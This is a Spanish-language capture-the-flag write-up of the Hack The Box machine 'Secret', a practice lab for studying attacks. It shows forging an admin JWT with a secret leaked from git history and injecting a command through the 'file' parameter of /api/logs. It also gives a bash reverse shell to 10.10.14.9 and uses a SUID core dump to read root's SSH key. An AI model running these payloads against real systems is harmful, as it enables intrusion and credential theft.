---
title: Secret WriteUp
date: 2023-03-28
categories: [WriteUps, Máquinas Linux]
tags: [JWT, Curl, API, Procesos, git, SUID, código]
image:
  path: ../../assets/img/writeups/Secret/secret.png
  width: 528
  height: 330
  alt: Banner Secret
---

Realizando un escaneo de puertos encuentro abiertos los puertos 22, 80 y 3000. Entrando a la página web me comparten el código fuente y en la propia web me explican como registrarme. Me registro y consigo un JWT (Jason Web Token). En el código visualizo un directorio .git, en uno de los commits consigo ver el "secret" -la clave para crear un JWT con el usuario que quiera-. Creo un JWT para "theadmin" que es el administrador. Observando el código encuentro una instrucción exec si me logeo con ese usuario, me aprovecho de eso y consigo lanzarme una reverse shell.

Escalada:

Encuentro un ejecutable con permisos SUID. El programa lee el contenido del archivo que le indiquemos y nos representa el número de palabras que tiene, solo eso, no muestra el contenido. En el código del programa aparece el término Core-Dump, volcado de memoria, pienso que si interrumpo el programa el contenido podría verse en alguna parte.  
Ejecuto el programa y lo mando a segundo plano, luego envío la señal SIGSEGV que provoca una segmentation fault, la cual crashea el programa. Este crasheo se guardará en /var/crash y podré ver su contenido, lo que pedí fue el id_rsa de root y con este me conecto por ssh a la máquina como usuario root.




## Reconocimiento

Decir que en hack the box se parte de dentro de la misma red de la máquina objetivo. En las máquinas de HTB que nos enfrentamos suele ser así. La ip de la máquina es la `10.10.11.120`. Comprobaré que tengo conexión a ella y si está operativa con un ping.
```
❯ ping -c 1 10.10.11.120
PING 10.10.11.120 (10.10.11.120) 56(84) bytes of data.
64 bytes from 10.10.11.120: icmp_seq=1 ttl=63 time=43.0 ms

--- 10.10.11.120 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 43.015/43.015/43.015/0.000 ms
```
Un **ttl** cercano a 64 es identificativo de una máquina Linux, un ttl cercano a 128 nos diría que la máquina es Windows. Esta pues, es Linux.  
Un paquete trasnmitido y un paquete recibido, todo marcha.

Y bien, ¿cómo entramos a la máquina?. Aprovechándonos de los puertos y por consiguiente de los servicios que tenga abiertos. Realizo un escaneo de los puertos:
```
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.120 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-24 16:48 CET
Initiating SYN Stealth Scan at 16:48
Scanning 10.10.11.120 [65535 ports]
Discovered open port 80/tcp on 10.10.11.120
Discovered open port 22/tcp on 10.10.11.120
Discovered open port 3000/tcp on 10.10.11.120
Completed SYN Stealth Scan at 16:48, 12.97s elapsed (65535 total ports)
Nmap scan report for 10.10.11.120
Host is up, received user-set (0.043s latency).
Scanned at 2023-03-24 16:48:09 CET for 13s
Not shown: 65514 closed tcp ports (reset), 18 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
3000/tcp open  ppp     syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.51 seconds
           Raw packets sent: 67194 (2.957MB) | Rcvd: 65602 (2.624MB)
```
Explicación de las opciones del comando anterior:
* -p- : Escanea todos los puertos. Hay un total de 65535 puertos
* --open : Muestra únicamente los puertos abiertos.
* -sS : Realiza un TCP SYN Scan
* --min-rate 5000 : Para enviar paquetes no más lentos que 5000 paquetes por segundo
* -vvv : Muestra la información en pantalla mientras se realiza el escaneo
* -n : Para no aplicar resolución DNS
* -Pn : Para que no aplique el protocolo ARP
* 10.10.11.120 : Dirección IP objetivo, la cual quiero escanear
* -oG allPorts -> Exportará el output a un fichero grepeable que llamaremos "allPorts"

De esos puertos que nmap ha descubierto abiertos realizaremos un nuevo escaneo algo más profundo de los servicios y versiones que corren sobre ellos:
```
❯ nmap -p22,80,3000 -sC -sV 10.10.11.120 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-24 16:52 CET
Nmap scan report for 10.10.11.120
Host is up (0.045s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DUMB Docs
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.47 seconds
```

Los puertos abiertos de la máquina son:
* 22: ssh
* 80: http
* 3000: http

## Buscando Vulnerabilidades

Tenemos tres puertos por donde atacar. El 22-ssh; sin credenciales podríamos realizar un ataque de fuerza bruta para descubrir usuarios y contraseñas, pero teniendo el puerto 80-http abierto suelo empezar por ahí. Además tenemos el 3000-http, otro servicio web donde buscar alguna vuln.

### **Puerto 80**

Desde la terminal voy a usar la herramienta whatweb para analizar superficialmente la web; servidor web, CMS y otras tecnologías que use.
```
❯ whatweb http://10.10.11.120

http://10.10.11.120 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.120], Lightbox, Meta-Author[Xiaoying Riley at 3rd Wave Media], Script, Title[DUMB Docs], X-Powered-By[Express], X-UA-Compatible[IE=edge], nginx[1.18.0]
```
Para el **puerto 3000** es igual, así que entiendo que serán las mismas páginas:
```
❯ whatweb http://10.10.11.120:3000

http://10.10.11.120:3000 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, IP[10.10.11.120], Lightbox, Meta-Author[Xiaoying Riley at 3rd Wave Media], Script, Title[DUMB Docs], X-Powered-By[Express], X-UA-Compatible[IE=edge]
```

Entraré a la página web desde el navegador para ver que pinta tiene y seguir buscando vulnerabilidades.

![Web-1]({{ 'assets/img/writeups/Secret/webArriba.png' | relative_url }}){: .center-image }

En la parte de abajo de la web me permite descargar el código fuente de la API mostrada en la web.

Arriba a la derecha veo **Live Demo** si pincho me lleva a la parte de la API, deduzco que puedo interactuar con ella desde el navegador.

![Api]({{ 'assets/img/writeups/Secret/api.png' | relative_url }}){: .center-image }

En la página principal de la web veo algo de documentación, y un apartado que señala "register user". Entro en esa parte y me indican como registrarnos y después logearnos, consiguiendo un jwt (jason web token).  
Para registrarme usaré el comando curl desde terminal.

```
❯ curl -X POST -d '{"name":"guillermo","email":"guillermo@secret.com","password":"guillermo123"}' -H 'Content-Type: Application/json' http://10.10.11.120/api/user/register

{"user":"guillermo"}#
```
Tiene pinta que nos ha creado el usuario, probaré a logearme ahora:
```
❯ curl -X POST -d '{"email":"guillermo@secret.com","password":"guillermo123"}' -H 'Content-Type: Application/json' http://10.10.11.120/api/user/login

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NDIxYTI2ZjQ3ZjZlNTA0NjNhNjdmOTQiLCJuYW1lIjoiZ3VpbGxlcm1vIiwiZW1haWwiOiJndWlsbGVybW9Ac2VjcmV0LmNvbSIsImlhdCI6MTY3OTkyNjA5NH0.ZHu8rIH3Wx5j-rUaVJMtu6-HGkzZjGBCUHf2MeRfKzk
```
Obtengo un token de mi usuario que guardaré por si las moscas.

Llegados a este punto voy a analizar un poco el código que nos descargamos antes.

![Index]({{ 'assets/img/writeups/Secret/sourceIndex.png' | relative_url }}){: .center-image }

Puedo ver unas cuantas rutas y que carga unas variables de entorno para conectarse a la base de datos; `process.env.DB_CONNECT`  
Quiero descubrir si puedo encontrar algo interesante en algún archivo .env  o similar por el recurso descargado. Lo encuentro, un .env:
```
> cat .env

DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret
```
El token_secret no va a ser secret, ya que no tiene ninguna pinta de token. Aunque antes de seguir avanzando hay que saber como funciona esto de los JWT; Normalmente conociendo una clave/token-secret puedo averiguar mediante un token que datos están en ese token (usuario, contraseña y email), y no solo eso, también puedo hacerme pasar por usuario que yo quiera a partir de esa clave/token-secret, sé lo que piensas, si, también podría crear al usuario admin.

Aun así tengo que averiguar cual es el token_secret porque ese no va a ser..

## Explotación

Puedo pensar que en el código descargado esta el token_secret real. Husmeando un poco, muy poco porque está en el primer directorio, me encuentro una carpeta .git ¿qué quiero decir eso? que puede haber commits e igual encontramos cosillas interesantes.  
Entro en el directorio .git y realizo el comando típico para ver el historial de commits:
```
❯ git log --oneline

e297a27 (HEAD -> master) now we can view logs from server 😃
67d8da7 removed .env for security reasons
de0a46b added /downloads
4e55472 removed swap
3a367e7 added downloads
55fe756 first commit
```
La opción --online se puede suponer, es para que te imprima el commit en una misma línea.

Me llama la atención el commit que señala "removed .env for security reasons".
``` 
❯ git show 67d8da7

commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons

diff --git a/.env b/.env
index fb6f587..31db370 100644
--- a/.env
+++ b/.env
@@ -1,2 +1,2 @@
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret
```
¡ Y encontramos un TOKEN_SECRET!. Si es el real podremos hacernos pasar por cualquier usuario. Y el que más me apetece ser es el admin, peero ojeando un poco antes me encontré con un archivo que cuyo nombre me dieron ganas de abrir, me refiero al `private.js `(dentro de la carpeta /routes):

![Source-Admin]({{ 'assets/img/writeups/Secret/sourceAdmin.png' | relative_url }}){: .center-image }

Podemos ver que el usuario administrador se llama realmente **theadmin**. Así que ahora teniendo el "secreto" voy a intentar crear un JWT del usuario theadmin.   
El fichero de arriba viene bien porque también podremos comprobar si funciona, porque si nos conectamos como un usuario normal nos informará de ello y si , por el contrario, lo hacemos con theadmin también nos informará con otra respuesta distinta. Por ejemplo, con mi usuario creado antes:
```
❯ curl -s -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NDIxYTI2ZjQ3ZjZlNTA0NjNhNjdmOTQiLCJuYW1lIjoiZ3VpbGxlcm1vIiwiZW1haWwiOiJndWlsbGVybW9Ac2VjcmV0LmNvbSIsImlhdCI6MTY3OTkyNjA5NH0.ZHu8rIH3Wx5j-rUaVJMtu6-HGkzZjGBCUHf2MeRfKzk' http://10.10.11.120/api/priv | jq

{
  "role": {
    "role": "you are normal user",
    "desc": "guillermo"
  }
}
```
La ruta a mandar sé que es /priv porque lo ponía en el fichero private.js. El tema de la cabecera lo saco del archivo verytoken.js: `const token = req.header("auth-token");`

Ahora toca crear el JWT con usuario theadmin, para ello usaré **python**, también se puede hacer en la página web **jwt.io**.

Corro python3 desde consola. Tengo que instalarme pyjwt, lo hago con `pip3 install pyjwt`.
```
>>> import jwt
>>> token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NDIxYTI2ZjQ3ZjZlNTA0NjNhNjdmOTQiLCJuYW1lIjoiZ3VpbGxlcm1vIiwiZW1haWwiOiJndWlsbGVybW9Ac2VjcmV0LmNvbSIsImlhdCI6MTY3OTkyNjA5NH0.ZHu8rIH3Wx5j-rUaVJMtu6-HGkzZjGBCUHf2MeRfKzk'
>>> secret = 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE'
```
Entonces decodeo con la función jwt.decode:
```
jwt.decode(token, secret)

Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python3/dist-packages/jwt/api_jwt.py", line 119, in decode
    decoded = self.decode_complete(jwt, key, algorithms, options, **kwargs)
  File "/usr/lib/python3/dist-packages/jwt/api_jwt.py", line 86, in decode_complete
    raise DecodeError(
jwt.exceptions.DecodeError: It is required that you pass in a value for the "algorithms" argument when calling decode().
```
Nos da un error. Buscando un poco por el **internete** encontramos la solución:
```
>>> jwt.decode(token, secret, algorithms=["HS256", "RS256"])

{'_id': '6421a26f47f6e50463a67f94', 'name': 'guillermo', 'email': 'guillermo@secret.com', 'iat': 1679926094}
```
¡Perfecto, funciona, es válido el secret!.

Lo siguiente es crear el token para **theadmin**:
```
>>> j = jwt.decode(token, secret, algorithms=["HS256", "RS256"])
>>> j['name'] = ['theadmin']
>>> jwt.encode(j, secret)

'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2NDIxYTI2ZjQ3ZjZlNTA0NjNhNjdmOTQiLCJuYW1lIjpbInRoZWFkbWluIl0sImVtYWlsIjoiZ3VpbGxlcm1vQHNlY3JldC5jb20iLCJpYXQiOjE2Nzk5MjYwOTR9.puIuQaDX9t0udVwZT7NTzPrNNe8XF8h0A6soVFRJZ0M'
```
j será el listado de id, name, email e iat. Siguiente comando cambio la parte del nombre por el "theadmin". Tercer comando para encodear y conseguir el jwt.

Comprobemos si somos ese usuario:
```
❯ curl -s -H 'auth-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2NDIxYTI2ZjQ3ZjZlNTA0NjNhNjdmOTQiLCJuYW1lIjpbInRoZWFkbWluIl0sImVtYWlsIjoiZ3VpbGxlcm1vQHNlY3JldC5jb20iLCJpYXQiOjE2Nzk5MjYwOTR9.puIuQaDX9t0udVwZT7NTzPrNNe8XF8h0A6soVFRJZ0M' http://10.10.11.120/api/priv | jq

{
  "creds": {
    "role": "admin",
    "username": "theadmin",
    "desc": "welcome back admin"
  }
}
```
## Explotación - Parte 2
¡ Y sí !!. Bien...¿ y ahora qué hacemos siendo theadmin?. Igual lo tendría que haber dicho antes no sé..peeero en el mismo private.js encontré esto:

![Source-Exec]({{ 'assets/img/writeups/Secret/sourceExec.png' | relative_url }}){: .center-image }

Ese exec tiene muy mala pinta y estoy pensando en meter en el parámetro file un ; y luego intentar ejecutar comandos. 

Lanzaré un ping por ejemplo para comprobar RCE.

```
❯ curl -s -H 'auth-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2NDIxYTI2ZjQ3ZjZlNTA0NjNhNjdmOTQiLCJuYW1lIjpbInRoZWFkbWluIl0sImVtYWlsIjoiZ3VpbGxlcm1vQHNlY3JldC5jb20iLCJpYXQiOjE2Nzk5MjYwOTR9.puIuQaDX9t0udVwZT7NTzPrNNe8XF8h0A6soVFRJZ0M' 'http://10.10.11.120/api/logs?file=;ping+-c+1+10.10.14.9'

"80bf34c fixed typos 🎉\n0c75212 now we can view logs from server 😃\nab3e953 Added the codes\nPING 10.10.14.9 (10.10.14.9) 56(84) bytes of data.\n64 bytes from 10.10.14.9: icmp_seq=1 ttl=63 time=123 ms\n\n--- 10.10.14.9 ping statistics ---\n1 packets transmitted, 1 received,
```
Tenemos RCE (Remote Command Execution).

Curl es una maravilla, también se puede hacer de esta manera, esta vez lanzamos comando id:
```
❯ curl -s -G "http://10.10.11.120/api/logs" --data-urlencode "file=;id" -H "auth-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2NDIxYTI2ZjQ3ZjZlNTA0NjNhNjdmOTQiLCJuYW1lIjpbInRoZWFkbWluIl0sImVtYWlsIjoiZ3VpbGxlcm1vQHNlY3JldC5jb20iLCJpYXQiOjE2Nzk5MjYwOTR9.puIuQaDX9t0udVwZT7NTzPrNNe8XF8h0A6soVFRJZ0M" | jq

"80bf34c fixed typos 🎉\n0c75212 now we can view logs from server 😃\nab3e953 Added the codes\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\n"
```
La opción -G y --data-urlencode van de la mano, esta opción te urlencodea la data y así no tienes que ir cambiando mases por espacios como en la instrucción anterior.

Nos ponemos en escucha por el puerto 443 `nc -nlvp 443`, toca conseguir una shell:
```
❯ curl -s -G "http://10.10.11.120/api/logs" --data-urlencode "file=;bash -c 'bash -i >& /dev/tcp/10.10.14.9/443 0>&1'" -H "auth-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2NDIxYTI2ZjQ3ZjZlNTA0NjNhNjdmOTQiLCJuYW1lIjpbInRoZWFkbWluIl0sImVtYWlsIjoiZ3VpbGxlcm1vQHNlY3JldC5jb20iLCJpYXQiOjE2Nzk5MjYwOTR9.puIuQaDX9t0udVwZT7NTzPrNNe8XF8h0A6soVFRJZ0M" | jq
``` 
Y por el puerto 443, en escucha, conseguimos la reverse shell.
```
❯ nc -nlvp 443

listening on [any] 443 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.11.120] 44052
bash: cannot set terminal process group (1123): Inappropriate ioctl for device
bash: no job control in this shell
dasith@secret:~/local-web$ whoami
dasith
dasith@secret:~/local-web$ 
```
Realizamos el tratamiento típico de la tty:
```
dasith@secret:~/local-web$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
dasith@secret:~/local-web$ ^Z
zsh: suspended  nc -nlvp 443
```
Con lo último nos saldrá de la terminal objetivo. Ahora en la nuestra:
```
> stty raw -echo; fg
            reset xterm
```
Recuperamos terminal ajena. Y ya por último:
```
dasith@secret:~/local-web$ export TERM=xterm
dasith@secret:~/local-web$ export SHELL=bash
dasith@secret:~/local-web$ stty rows 38 columns 184
```
Somos el usuario dashith, vamos a visualizar la primera flag:
``` 
dasith@secret:~$ cat user.txt
fa17dfc3b275eb4dac98cf*********
```

## Escalada de privilegios

```
dasith@secret:~$ id
uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)

dasith@secret:~$ sudo -l
[sudo] password for dasith:     *** No tenemos así que malamente

dasith@secret:~$ find / \-perm -4000 2>/dev/null
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/opt/count
```
Paremos aquí, ese /opt/count no es normal, no es un programa por defecto que este en muchas máquinas.
```
dasith@secret:/opt$ ls -l
total 32
-rw-r--r-- 1 root root  3736 Oct  7  2021 code.c
-rwsr-xr-x 1 root root 17824 Oct  7  2021 count
-rw-r--r-- 1 root root  4622 Oct  7  2021 valgrind.log
```
Puedo ejecutarlo, vamos a ver que pasa
```
dasith@secret:/opt$ ./count
Enter source file/directory name: /root/root.txt

Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]: y
Path: /tmp/prueba
```
Te lee el contenido de un archivo y te cuenta las letras y los números. Después te permite guardar el resultado del programa
``` 
dasith@secret:/opt$ cat /tmp/prueba
Total characters = 33
Total words      = 2
Total lines      = 2
``` 

Tengo que revistar el código, se encuentra en la misma carpeta que el ejecutable. Leyendo un poco y rompiendome la cabeza **[ Aviso Importante: Esta bien pensar y buscar la vulnerabilidad por tu cuenta, pero si estáis bloqueados en una parte recomendaría buscar writeups, todxs lo hemos hecho. Yo si en una hora u hora y media no encuentro nada tiro de WriteUps, se aprende mucho de ellos ]**  
Bueeno sigo..Veo esto

![Code-Escalada]({{ 'assets/img/writeups/Secret/codeEscalada.png' | relative_url }}){: .center-image }

Coredump es volcado a memoria, la segunda instrucción; `prctl(PR_SET_DUMPABLE)` lo que hace, o así lo entiendo yo, es que la señal enviada al proceso (recuerda que el comando kill manda señales al proceso) establecerá por defecto un core dump. Entonces pienso:
"El programa **count** esta claro que lee el fichero, estoy viendo que lo vuelca a memoria ¿ y si puedo verlo ahí?".

¿En qué punto del código está esa instrucción?. Antes de llegar a la segunda pregunta, donde te pide guardar el output. Así que si llegamos a a ese punto se realizará el comando **pero tendremos que enviar una señal al proceso..**. Estas señales se envian con el comando kill. 

Lo que haré es dejar el proceso en segundo plano para poder verlo y mandarle una señal que lo vuelque a memoria para así visualizar el contenido del archivo.
```
dasith@secret:/opt$ ./count

Enter source file/directory name: /root/.ssh/id_rsa

Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]: ^Z
[1]+  Stopped                 ./count

dasith@secret:/opt$ ps -aux | grep count

root         860  0.0  0.1 235676  7432 ?        Ssl  13:33   0:00 /usr/lib/account/
dasith      1647  0.0  0.0   2488   580 pts/0    T    17:44   0:00 ./count
dasith      1650  0.0  0.0   6432   740 pts/0    S+   17:46   0:00 grep --color=auto count
``` 
El pid del proceso es 1647. Mandamos señal:
``` 
dasith@secret:/opt$ kill -SIGSEGV 1647
``` 
La señal `SIGSEGV` provoca una **segmentation fault** lo cual crashea el programa.
Estos crasheos se guardan en /var/crash
``` 
dasith@secret:/opt$ cd /var/crash
dasith@secret:/var/crash$ ls

_opt_count.0.crash  _opt_countzz.0.crash

dasith@secret:/var/crash$ fg

./count	(wd: /opt)
Segmentation fault (core dumped)
```
El comando **fg** es de foreground saca un proceso de segundo plano al primero digamos. Recuerda que lo mandamos a segundo plano con Ctrl + Z anteriormente.  
Ahora si que veremos el crash que nos interesa
```
dasith@secret:/var/crash$ ls -l

total 84
-rw-r----- 1 root   root   27203 Oct  6  2021 _opt_count.0.crash
-rw-r----- 1 dasith dasith 31382 Mar 27 18:18 _opt_count.1000.crash
-rw-r----- 1 root   root   24048 Oct  5  2021 _opt_countzz.0.crash
```
Si lo intentas leer te sonara a chino , a no ser que sepas chino, está en formato BLOB (Binary Large Object). El comando apport-unpack descomprime el volcado dentro de un directorio que indiques. Lo creo primero y realizo el comando después.
```
dasith@secret:/var/crash$ mkdir /tmp/guise
dasith@secret:/var/crash$ apport-unpack _opt_count.1000.crash /tmp/guise
dasith@secret:/var/crash$ cd /tmp/guise
dasith@secret:/tmp/guise$ ls

Architecture  CoreDump  Date  DistroRelease  ExecutablePath  ExecutableTimestamp  ProblemType  ProcCmdline  ProcCwd  ProcEnviron  ProcMaps  ProcStatus  Signal  Uname  UserGroups

dasith@secret:/tmp/guise$ file CoreDump

CoreDump: ELF 64-bit LSB core file, x86-64, version 1 (SYSV), SVR4-style, from './count', real uid: 1000, effective uid: 0, real gid: 1000, effective gid: 1000, execfn: './count', platform: 'x86_64'
``` 
Es un binario ELF , para leer lo que nos interesa usaremos comando **strings**

``` 
> strings -n 30 CoreDump
```
La opción -n es cojonuda. Te saca cadenas de texto igual o mayor al número que le indicas. Como sé que lo que quiero sacar, la id_rsa, es larga y seguro que tiene más de 30 le lanzo esa opción. Y me quito toda lo que no me interesa ver de menos de 30 caracteres.

¡¡Consigo la id_rsa!!. No la saco entera para que no hagáis trampa.

![Id_rsa]({{ 'assets/img/writeups/Secret/id_rsa.png' | relative_url }}){: .center-image }

Y por último me conecto como root por ssh con la id_rsa.
```
> chmod 600 id_rsa
> ssh -i id_rsa root@10.10.11.120
``` 
![Final]({{ 'assets/img/writeups/Secret/final.png' | relative_url }}){: .center-image }

Y obtenemos la flag:
```
> cat /root/root.txt

7b593c6490a9ee2a9facc******
```
FIN.









